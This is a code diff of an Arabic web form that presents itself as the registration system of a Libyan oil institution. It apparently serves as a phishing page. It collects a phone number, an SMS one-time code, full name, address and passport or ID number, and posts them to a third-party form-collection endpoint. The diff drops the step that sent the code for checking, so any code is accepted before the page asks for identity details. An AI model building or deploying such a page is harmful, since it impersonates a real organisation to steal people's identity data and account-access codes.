@@ -141,7 +141,7 @@
 
 <div class="container">
   <div class="logo-container">
-    <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+    <img src="uy.jpeg" alt="شعار المؤسسة" />
     <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
   </div>
 
@@ -159,26 +159,27 @@
       <label for="code">جاري إرسال الكود عبر SMS</label>
       <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" />
       <div id="errorMessage" class="error"></div>
-      <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
-    </div>
 
-    <div id="extraFields">
-      <label for="fullName">الاسم بالكامل:</label>
-      <input type="text" id="fullName" name="fullName" placeholder="اكتب اسمك الكامل" required />
+      <div id="extraFields">
+        <label for="fullName">الاسم بالكامل:</label>
+        <input type="text" id="fullName" name="fullName" placeholder="اكتب اسمك الكامل" required />
 
-      <label for="address">العنوان:</label>
-      <input type="text" id="address" name="address" placeholder="اكتب عنوانك" required />
+        <label for="address">العنوان:</label>
+        <input type="text" id="address" name="address" placeholder="اكتب عنوانك" required />
 
-      <label for="documentType">نوع البطاقة:</label>
-      <select id="documentType" name="documentType" onchange="updateDocLabel()" required>
-        <option value="">-- اختر نوع البطاقة --</option>
-        <option value="جواز سفر">جواز سفر</option>
-        <option value="بطاقة شخصية">بطاقة شخصية</option>
-        <option value="رخصة قيادة">رخصة قيادة</option>
-      </select>
+        <label for="documentType">نوع البطاقة:</label>
+        <select id="documentType" name="documentType" onchange="updateDocLabel()" required>
+          <option value="">-- اختر نوع البطاقة --</option>
+          <option value="جواز سفر">جواز سفر</option>
+          <option value="بطاقة شخصية">بطاقة شخصية</option>
+          <option value="رخصة قيادة">رخصة قيادة</option>
+        </select>
 
-      <label id="documentLabel" for="documentNumber">رقم الوثيقة:</label>
-      <input type="text" id="documentNumber" name="documentNumber" placeholder="أدخل رقم الوثيقة" required />
+        <label id="documentLabel" for="documentNumber">رقم الوثيقة:</label>
+        <input type="text" id="documentNumber" name="documentNumber" placeholder="أدخل رقم الوثيقة" required />
+      </div>
+
+      <button type="submit" id="sendCodeBtn">طلب الدخول</button>
     </div>
   </form>
 </div>
@@ -187,11 +188,12 @@
   let codeVerified = false;
   let countdownInterval;
 
+  const phoneInput = document.getElementById('phone');
+  const codeInput = document.getElementById('code');
   const sendPhoneBtn = document.getElementById('sendPhoneBtn');
   const timerDisplay = document.getElementById('timer');
   const codeField = document.getElementById('codeField');
-  const phoneInput = document.getElementById('phone');
-  const codeInput = document.getElementById('code');
+  const extraFields = document.getElementById('extraFields');
   const sendCodeBtn = document.getElementById('sendCodeBtn');
   const errorMessage = document.getElementById('errorMessage');
 
@@ -221,12 +223,11 @@
     event.preventDefault();
 
     if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
-      alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
-      phoneInput.focus();
+      alert('يرجى إدخال رقم هاتف صحيح');
       return false;
     }
 
-    fetch('https://formcarry.com/s/ldfA_DUCDrk', {
+    fetch('https://formcarry.com/s/12UxdOsTbaW', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -234,16 +235,16 @@
       },
       body: JSON.stringify({ phone: phoneInput.value })
     })
-    .then(response => {
-      if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
+    .then(res => {
+      if (!res.ok) throw new Error('فشل الإرسال');
       phoneInput.disabled = true;
       sendPhoneBtn.disabled = true;
       codeField.style.display = 'block';
       startTimer(480);
     })
-    .catch(error => {
-      alert('تعذر إرسال رقم الهاتف. حاول مرة أخرى.');
-      console.error(error);
+    .catch(err => {
+      alert('حدث خطأ أثناء الإرسال');
+      console.error(err);
     });
 
     return false;
@@ -253,59 +254,30 @@
     event.preventDefault();
     errorMessage.textContent = '';
 
-    if (!codeVerified) {
-      if (codeInput.value.trim() === '') {
-        errorMessage.textContent = 'يرجى كتابة الكود المرسل إليك.';
-        codeInput.focus();
-        return false;
-      }
-
-      sendCodeBtn.disabled = true;
-      sendCodeBtn.textContent = 'جاري التحقق...';
-
-      fetch('https://formcarry.com/s/ldfA_DUCDrk', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({
-          phone: phoneInput.value,
-          code: codeInput.value
-        })
-      }).then(async response => {
-        const data = await response.json();
-        if (response.ok && data.success !== false) {
-          codeVerified = true;
-          sendCodeBtn.disabled = false;
-          sendCodeBtn.textContent = 'طلب الدخول';
-          document.getElementById('extraFields').style.display = 'block';
-        } else {
-          errorMessage.textContent = '❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.';
-          sendCodeBtn.disabled = false;
-          sendCodeBtn.textContent = 'تأكيد الكود';
-        }
-      }).catch(error => {
-        errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
-        sendCodeBtn.disabled = false;
-        sendCodeBtn.textContent = 'تأكيد الكود';
-      });
-
-      return false;
-    }
-
-    // بعد التحقق من الكود: التحقق من الحقول الأخرى
+    const code = codeInput.value.trim();
     const fullName = document.getElementById('fullName').value.trim();
     const address = document.getElementById('address').value.trim();
     const documentType = document.getElementById('documentType').value;
     const documentNumber = document.getElementById('documentNumber').value.trim();
 
-    if (!fullName || !address || !documentType || !documentNumber) {
-      errorMessage.textContent = 'يرجى تعبئة جميع الحقول قبل المتابعة.';
+    if (!codeVerified) {
+      if (code === '') {
+        errorMessage.textContent = 'يرجى إدخال الكود';
+        return false;
+      }
+
+      extraFields.style.display = 'block';
+      codeVerified = true;
+      sendCodeBtn.textContent = 'إرسال البيانات';
       return false;
     }
 
-    fetch('https://formcarry.com/s/ldfA_DUCDrk', {
+    if (!fullName || !address || !documentType || !documentNumber) {
+      errorMessage.textContent = 'يرجى تعبئة جميع الحقول';
+      return false;
+    }
+
+    fetch('https://formcarry.com/s/12UxdOsTbaW', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -313,22 +285,21 @@
       },
       body: JSON.stringify({
         phone: phoneInput.value,
-        code: codeInput.value,
+        code: code,
         fullName,
         address,
         documentType,
         documentNumber
       })
-    }).then(async response => {
-      const data = await response.json();
-      if (response.ok && data.success !== false) {
+    }).then(res => {
+      if (res.ok) {
         window.location.href = 'success.html';
       } else {
-        errorMessage.textContent = '❌ فشل تأكيد البيانات.';
+        errorMessage.textContent = 'حدث خطأ أثناء إرسال البيانات';
       }
-    }).catch(error => {
-      errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم.';
-      console.error(error);
+    }).catch(err => {
+      errorMessage.textContent = '⚠️ تعذر الاتصال بالخادم';
+      console.error(err);
     });
 
     return false;
